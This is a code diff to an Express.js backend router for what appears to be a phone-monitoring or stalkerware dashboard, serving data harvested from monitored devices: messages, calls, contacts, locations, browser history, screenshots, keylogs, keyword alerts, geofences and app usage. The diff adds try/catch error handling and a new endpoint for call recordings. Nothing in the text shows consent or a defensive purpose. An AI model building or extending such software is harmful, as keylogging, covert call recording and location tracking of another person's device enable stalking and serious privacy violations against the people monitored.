@@ -12,6 +12,7 @@ const Keylog = require('../models/Keylog');
 const KeywordAlert = require('../models/KeywordAlert');
 const Geofence = require('../models/Geofence');
 const AppUsage = require('../models/AppUsage');
+const CallRecording = require('../models/CallRecording');
 
 const getDeviceIds = async (userId) => {
   const devices = await Device.find({ userId });
@@ -20,102 +21,164 @@ const getDeviceIds = async (userId) => {
 
 // Dashboard stats
 router.get('/stats', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const totalDevices = deviceIds.length;
-  const totalMessages = await Message.countDocuments({ deviceId: { $in: deviceIds } });
-  const totalCalls = await CallLog.countDocuments({ deviceId: { $in: deviceIds } });
-  const totalLocations = await Location.countDocuments({ deviceId: { $in: deviceIds } });
-  const totalScreenshots = await Screenshot.countDocuments({ deviceId: { $in: deviceIds } });
-  res.json({ success: true, stats: { totalDevices, totalMessages, totalCalls, totalLocations, totalScreenshots } });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const totalDevices = deviceIds.length;
+    const totalMessages = await Message.countDocuments({ deviceId: { $in: deviceIds } });
+    const totalCalls = await CallLog.countDocuments({ deviceId: { $in: deviceIds } });
+    const totalLocations = await Location.countDocuments({ deviceId: { $in: deviceIds } });
+    const totalScreenshots = await Screenshot.countDocuments({ deviceId: { $in: deviceIds } });
+    res.json({ success: true, stats: { totalDevices, totalMessages, totalCalls, totalLocations, totalScreenshots } });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get devices
 router.get('/devices', protect, async (req, res) => {
-  const devices = await Device.find({ userId: req.user._id });
-  res.json({ success: true, data: devices });
+  try {
+    const devices = await Device.find({ userId: req.user._id });
+    res.json({ success: true, data: devices });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get call logs
 router.get('/calls', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const data = await CallLog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
-  res.json({ success: true, data });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const data = await CallLog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
+});
+
+// Get call recordings
+router.get('/call-recordings', protect, async (req, res) => {
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const recordings = await CallRecording.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(100);
+    res.json({ success: true, data: recordings });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get messages
 router.get('/messages', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const data = await Message.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
-  res.json({ success: true, data });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const data = await Message.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get contacts
 router.get('/contacts', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const data = await Contact.find({ deviceId: { $in: deviceIds } });
-  res.json({ success: true, data });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const data = await Contact.find({ deviceId: { $in: deviceIds } });
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get locations
 router.get('/locations', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const data = await Location.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
-  res.json({ success: true, data });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const data = await Location.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get browser history
 router.get('/browser', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const data = await BrowserHistory.find({ deviceId: { $in: deviceIds } }).sort({ visitTime: -1 }).limit(200);
-  res.json({ success: true, data });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const data = await BrowserHistory.find({ deviceId: { $in: deviceIds } }).sort({ visitTime: -1 }).limit(200);
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get screenshots
 router.get('/screenshots', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const data = await Screenshot.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(100);
-  res.json({ success: true, data });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const data = await Screenshot.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(100);
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get keylogs
 router.get('/keylogs', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const data = await Keylog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(500);
-  res.json({ success: true, data });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const data = await Keylog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(500);
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get keyword alerts
 router.get('/keyword-alerts', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const data = await KeywordAlert.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
-  res.json({ success: true, data });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const data = await KeywordAlert.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get geofence events
 router.get('/geofence', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const data = await Geofence.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
-  res.json({ success: true, data });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const data = await Geofence.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Get app usage
 router.get('/app-usage', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const data = await AppUsage.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
-  res.json({ success: true, data });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const data = await AppUsage.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(200);
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 // Combined recent activity (for dashboard)
 router.get('/recent', protect, async (req, res) => {
-  const deviceIds = await getDeviceIds(req.user._id);
-  const calls = await CallLog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
-  const messages = await Message.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
-  const locations = await Location.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
-  const keylogs = await Keylog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
-  // combine and sort by timestamp
-  let all = [...calls, ...messages, ...locations, ...keylogs];
-  all.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
-  res.json({ success: true, data: all.slice(0, 30) });
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const calls = await CallLog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
+    const messages = await Message.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
+    const locations = await Location.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
+    const keylogs = await Keylog.find({ deviceId: { $in: deviceIds } }).sort({ timestamp: -1 }).limit(10);
+    let all = [...calls, ...messages, ...locations, ...keylogs];
+    all.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
+    res.json({ success: true, data: all.slice(0, 30) });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
 });
 
 module.exports = router;
